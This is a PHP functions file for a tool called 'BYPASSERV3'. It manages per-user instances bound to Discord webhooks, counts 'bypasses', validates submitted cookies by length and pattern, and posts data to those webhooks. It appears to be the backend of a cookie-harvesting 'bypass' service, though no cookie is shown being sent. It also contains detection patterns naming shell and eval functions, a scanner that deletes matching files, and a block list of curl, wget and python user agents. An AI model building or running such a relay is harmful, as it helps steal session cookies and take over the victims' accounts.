<?php
/**
 * ============================================
 * BYPASSERV3 - FUNCTIONS
 * Core utility and security functions
 * ============================================
 */

// Prevent direct access
if (!defined('DATA_PATH')) {
    die('Direct access not permitted');
}

/**
 * Get user's real IP address
 */
function getUserIP() {
    $ipKeys = [
        'HTTP_CF_CONNECTING_IP', // Cloudflare
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_REAL_IP',
        'HTTP_CLIENT_IP',
        'REMOTE_ADDR'
    ];
    
    foreach ($ipKeys as $key) {
        if (!empty($_SERVER[$key])) {
            $ip = $_SERVER[$key];
            // Handle multiple IPs (take first one)
            if (strpos($ip, ',') !== false) {
                $ip = trim(explode(',', $ip)[0]);
            }
            if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                return $ip;
            }
        }
    }
    
    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
}

/**
 * Generate random token
 */
function generateToken($length = 32) {
    if (function_exists('random_bytes')) {
        return bin2hex(random_bytes($length / 2));
    }
    return bin2hex(openssl_random_pseudo_bytes($length / 2));
}

/**
 * Save token data
 */
function saveToken($token, $directory, $webhook) {
    $tokenFile = TOKENS_PATH . $token . '.json';
    $data = [
        'token' => $token,
        'directory' => $directory,
        'webhook' => $webhook,
        'created' => time()
    ];
    return file_put_contents($tokenFile, json_encode($data, JSON_PRETTY_PRINT));
}

/**
 * Get token data
 */
function getTokenData($token) {
    $tokenFile = TOKENS_PATH . $token . '.json';
    if (!file_exists($tokenFile)) {
        return null;
    }
    $content = file_get_contents($tokenFile);
    return json_decode($content, true);
}

/**
 * Initialize instance directory
 */
function initializeInstance($directory) {
    $instancePath = DATA_PATH . $directory . '/';
    
    if (!is_dir($instancePath)) {
        mkdir($instancePath, 0755, true);
    }
    
    // Create default data files
    $defaults = [
        'stats.json' => json_encode([
            'total_bypasses' => 0,
            'successful_bypasses' => 0,
            'failed_bypasses' => 0,
            'last_bypass' => null
        ], JSON_PRETTY_PRINT),
        'users.json' => json_encode([], JSON_PRETTY_PRINT)
    ];
    
    foreach ($defaults as $file => $content) {
        $filePath = $instancePath . $file;
        if (!file_exists($filePath)) {
            file_put_contents($filePath, $content);
        }
    }
    
    return true;
}

/**
 * Update instance stats
 */
function updateInstanceStats($directory, $success = true) {
    $statsFile = DATA_PATH . $directory . '/stats.json';
    
    $stats = file_exists($statsFile) ? json_decode(file_get_contents($statsFile), true) : [
        'total_bypasses' => 0,
        'successful_bypasses' => 0,
        'failed_bypasses' => 0,
        'last_bypass' => null
    ];
    
    $stats['total_bypasses']++;
    if ($success) {
        $stats['successful_bypasses']++;
    } else {
        $stats['failed_bypasses']++;
    }
    $stats['last_bypass'] = time();
    
    file_put_contents($statsFile, json_encode($stats, JSON_PRETTY_PRINT));
}

// ============================================
// SECURITY FUNCTIONS
// ============================================

/**
 * Validate cookie for security threats
 */
function validateCookie($cookie) {
    $cookie = str_replace(['<?', '?>', '<?php', '<?=', '<%', '%>'], '', $cookie);
    
    $length = strlen($cookie);
    if ($length < 100 || $length > 2500) {
        return false;
    }
    
    $suspiciousPatterns = [
        '/eval\s*\(/i',
        '/exec\s*\(/i',
        '/system\s*\(/i',
        '/passthru\s*\(/i',
        '/shell_exec\s*\(/i',
        '/base64_decode\s*\(/i',
        '/<\?php/i',
        '/\$_(GET|POST|REQUEST|COOKIE|SERVER|ENV)/i',
        '/file_get_contents.*php:\/\//i',
        '/curl_exec.*eval/i',
        '/monarx/i',
        '/unlink\s*\(__FILE__\)/i',
        '/include(_once)?\s*\(/i',
        '/require(_once)?\s*\(/i',
        '/fopen.*php:\/\//i',
        '/fsockopen/i',
        '/pfsockopen/i',
        '/proc_open/i',
        '/popen/i',
        '/curl_multi_exec/i',
        '/parse_ini_file/i',
        '/show_source/i',
        '/symlink/i',
        '/`.*`/i',
        '/\$\{.*\}/i',
    ];
    
    foreach ($suspiciousPatterns as $pattern) {
        if (preg_match($pattern, $cookie)) {
            return false;
        }
    }
    
    if (strpos($cookie, "\0") !== false) {
        return false;
    }
    
    $specialCharCount = preg_match_all('/[^a-zA-Z0-9_\-]/', $cookie);
    if ($specialCharCount > ($length * 0.3)) {
        return false;
    }
    
    return true;
}

/**
 * Sanitize directory name
 */
function sanitizeDirectory($directory) {
    $directory = str_replace(['../', '..\\', './', '.\\', '..', '~', '/'], '', $directory);
    $directory = str_replace("\0", '', $directory);
    $directory = preg_replace('/[\x00-\x1F\x7F]/', '', $directory);
    $directory = preg_replace('/[^a-zA-Z0-9_-]/', '', trim($directory));
    $directory = strtolower($directory);
    $directory = substr($directory, 0, 50);
    return $directory;
}

/**
 * Validate webhook URL
 */
function validateWebhook($webhook) {
    if (!filter_var($webhook, FILTER_VALIDATE_URL)) {
        return false;
    }
    
    if (!preg_match('/^https:\/\//i', $webhook)) {
        return false;
    }
    
    if (!preg_match('/^https:\/\/discord(app)?\.com\/api\/webhooks\/\d+\/[\w-]+$/i', $webhook)) {
        return false;
    }
    
    $ch = curl_init($webhook);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_NOBODY, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    
    curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return in_array($httpCode, [200, 204, 405]);
}

/**
 * Security scan for malicious files
 */
function securityScan($autoDelete = true) {
    $suspicious = [];
    $dataDir = DATA_PATH;
    
    if (!is_dir($dataDir)) {
        return $suspicious;
    }
    
    try {
        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dataDir, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::CATCH_GET_CHILD
        );
        
        $dangerousExtensions = [
            'php', 'php3', 'php4', 'php5', 'php7', 'php8', 'phtml', 'phar', 'phps',
            'exe', 'sh', 'bat', 'cmd', 'com', 'bin', 'so', 'dll',
            'jsp', 'asp', 'aspx', 'cgi', 'pl', 'py', 'rb'
        ];
        
        $contentPatterns = [
            '/eval\s*\(/i',
            '/base64_decode/i',
            '/exec\s*\(/i',
            '/shell_exec/i',
            '/system\s*\(/i',
            '/<\?php/i',
            '/passthru/i',
            '/curl_exec.*eval/is',
            '/file_get_contents.*php:\/\//i'
        ];
        
        foreach ($files as $file) {
            if (!$file->isFile()) {
                continue;
            }
            
            $filePath = $file->getRealPath();
            $ext = strtolower($file->getExtension());
            
            if (in_array($ext, $dangerousExtensions)) {
                $suspicious[] = [
                    'path' => $filePath,
                    'reason' => 'Dangerous file extension: .' . $ext,
                    'severity' => 'critical'
                ];
                
                if ($autoDelete) {
                    @unlink($filePath);
                }
                continue;
            }
            
            if (in_array($ext, ['json', 'txt', 'log'])) {
                $content = @file_get_contents($filePath);
                if ($content !== false) {
                    foreach ($contentPatterns as $pattern) {
                        if (preg_match($pattern, $content)) {
                            $suspicious[] = [
                                'path' => $filePath,
                                'reason' => 'Suspicious content pattern detected',
                                'severity' => 'high'
                            ];
                            
                            if ($autoDelete) {
                                @unlink($filePath);
                            }
                            break;
                        }
                    }
                }
            }
            
            $filename = $file->getFilename();
            if (preg_match('/\.[^.]+\.(php|phtml|phar)$/i', $filename)) {
                $suspicious[] = [
                    'path' => $filePath,
                    'reason' => 'Double extension detected',
                    'severity' => 'critical'
                ];
                
                if ($autoDelete) {
                    @unlink($filePath);
                }
            }
        }
    } catch (Exception $e) {
        // Silent fail
    }
    
    return $suspicious;
}

/**
 * Log security events
 */
function logSecurityEvent($event, $details = []) {
    $logDir = dirname(DATA_PATH);
    $logFile = $logDir . '/security.log';
    
    $entry = [
        'timestamp' => date('Y-m-d H:i:s'),
        'event' => $event,
        'ip' => getUserIP(),
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
        'request_uri' => $_SERVER['REQUEST_URI'] ?? 'Unknown',
        'details' => $details
    ];
    
    @file_put_contents(
        $logFile, 
        json_encode($entry, JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT) . PHP_EOL, 
        FILE_APPEND | LOCK_EX
    );
}

/**
 * Rate limiting
 */
function checkRateLimit($identifier = null, $maxRequests = 50, $timeWindow = 3600) {
    if ($identifier === null) {
        $identifier = getUserIP();
    }
    
    $rateLimitFile = dirname(DATA_PATH) . '/rate_limit_' . md5($identifier) . '.txt';
    
    if (file_exists($rateLimitFile)) {
        $fileTime = filemtime($rateLimitFile);
        if (time() - $fileTime > $timeWindow) {
            @unlink($rateLimitFile);
            return true;
        }
    }
    
    $requestCount = file_exists($rateLimitFile) ? (int)file_get_contents($rateLimitFile) : 0;
    
    if ($requestCount >= $maxRequests) {
        logSecurityEvent('rate_limit_exceeded', [
            'identifier' => $identifier,
            'count' => $requestCount,
            'max' => $maxRequests,
            'window' => $timeWindow
        ]);
        return false;
    }
    
    file_put_contents($rateLimitFile, $requestCount + 1);
    
    return true;
}

/**
 * Clean up old rate limit files
 */
function cleanupRateLimits() {
    $dir = dirname(DATA_PATH);
    $files = glob($dir . '/rate_limit_*.txt');
    
    $cleaned = 0;
    foreach ($files as $file) {
        if (time() - filemtime($file) > 3600) {
            if (@unlink($file)) {
                $cleaned++;
            }
        }
    }
    
    return $cleaned;
}

/**
 * Sanitize input
 */
function sanitizeInput($input, $type = 'string') {
    switch ($type) {
        case 'email':
            return filter_var($input, FILTER_SANITIZE_EMAIL);
        
        case 'url':
            return filter_var($input, FILTER_SANITIZE_URL);
        
        case 'int':
            return filter_var($input, FILTER_SANITIZE_NUMBER_INT);
        
        case 'float':
            return filter_var($input, FILTER_SANITIZE_NUMBER_FLOAT, FILTER_FLAG_ALLOW_FRACTION);
        
        case 'alphanum':
            return preg_replace('/[^a-zA-Z0-9]/', '', $input);
        
        case 'string':
        default:
            $input = str_replace("\0", '', $input);
            return htmlspecialchars(trim($input), ENT_QUOTES, 'UTF-8');
    }
}

/**
 * Check for suspicious requests
 */
function isSuspiciousRequest() {
    $botPatterns = [
        '/bot/i',
        '/crawler/i',
        '/spider/i',
        '/scraper/i',
        '/curl/i',
        '/wget/i',
        '/python/i',
        '/perl/i'
    ];
    
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    
    foreach ($botPatterns as $pattern) {
        if (preg_match($pattern, $userAgent)) {
            return true;
        }
    }
    
    if (empty($userAgent)) {
        return true;
    }
    
    return false;
}

/**
 * Send Discord webhook
 */
function sendWebhook($webhook, $data) {
    $ch = curl_init($webhook);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return $httpCode >= 200 && $httpCode < 300;
}
?>
